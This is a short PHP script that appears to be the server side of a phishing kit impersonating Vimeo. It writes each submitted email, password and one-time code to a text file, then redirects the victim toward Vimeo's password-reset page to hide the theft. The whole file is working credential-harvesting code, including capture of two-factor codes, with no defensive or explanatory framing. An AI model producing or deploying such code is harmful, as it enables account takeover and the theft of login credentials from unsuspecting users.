<?php
file_put_contents("usernames.txt", "Vimeo Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] ."\nOTP: " . $_POST['otp'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://vimeo.com/forgot_password
header("Location: $url");
exit();
?>